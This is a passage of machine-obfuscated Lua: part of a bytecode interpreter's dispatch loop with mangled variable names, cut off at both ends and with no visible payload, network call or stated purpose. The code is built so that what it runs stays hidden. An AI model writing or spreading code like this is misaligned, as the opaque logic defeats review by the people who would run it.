DHRP_b=DHRP_b+1;else DHRP_b=DHRP_a[3];end;else DHRP_c[DHRP_a[2]]={};DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];if not DHRP_c[DHRP_a[2]]then DHRP_b=DHRP_b+1;else DHRP_b=DHRP_a[3];end;end;elseif DHRP_f<=26 then DHRP_c[DHRP_a[2]]={};elseif DHRP_f==27 then local DHRP_b=DHRP_a[2]local DHRP_d,DHRP_a=DHRP_n(DHRP_c[DHRP_b](DHRP_g(DHRP_c,DHRP_b+1,DHRP_a[3])))DHRP_h=DHRP_a+DHRP_b-1 local DHRP_a=0;for DHRP_b=DHRP_b,DHRP_h do DHRP_a=DHRP_a+1;DHRP_c[DHRP_b]=DHRP_d[DHRP_a];end;else local DHRP_h;local DHRP_f;DHRP_f=DHRP_a[2]DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2];DHRP_h=DHRP_c[DHRP_a[3]];DHRP_c[DHRP_f+1]=DHRP_h;DHRP_c[DHRP_f]=DHRP_h[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2];DHRP_h=DHRP_c[DHRP_a[3]];DHRP_c[DHRP_f+1]=DHRP_h;DHRP_c[DHRP_f]=DHRP_h[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];end;elseif DHRP_f<=31 then if DHRP_f<=29 then DHRP_c[DHRP_a[2]]=DHRP_k[DHRP_a[3]];elseif DHRP_f==30 then local DHRP_f;DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];else DHRP_c[DHRP_a[2]]();end;elseif DHRP_f<=32 then local DHRP_f;DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_c[DHRP_a[4]];elseif DHRP_f>33 then local DHRP_a=DHRP_a[2]DHRP_c[DHRP_a]=DHRP_c[DHRP_a](DHRP_c[DHRP_a+1])else DHRP_c[DHRP_a[2]]=(DHRP_a[3]~=0);end;elseif DHRP_f<=40 then if DHRP_f<=37 then if DHRP_f<=35 then local DHRP_h;local DHRP_f;DHRP_c[DHRP_a[2]]={};DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]][DHRP_a[3]]=DHRP_a[4];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_c[DHRP_f+1])DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_c[DHRP_a[3]][DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_e[DHRP_a[3]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2];DHRP_h=DHRP_c[DHRP_a[3]];DHRP_c[DHRP_f+1]=DHRP_h;DHRP_c[DHRP_f]=DHRP_h[DHRP_a[4]];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_c[DHRP_a[2]]=DHRP_a[3];DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2]DHRP_c[DHRP_f]=DHRP_c[DHRP_f](DHRP_g(DHRP_c,DHRP_f+1,DHRP_a[3]))DHRP_b=DHRP_b+1;DHRP_a=DHRP_d[DHRP_b];DHRP_f=DHRP_a[2];DHRP_h=DHRP_c[DHRP_a[3]];DHRP_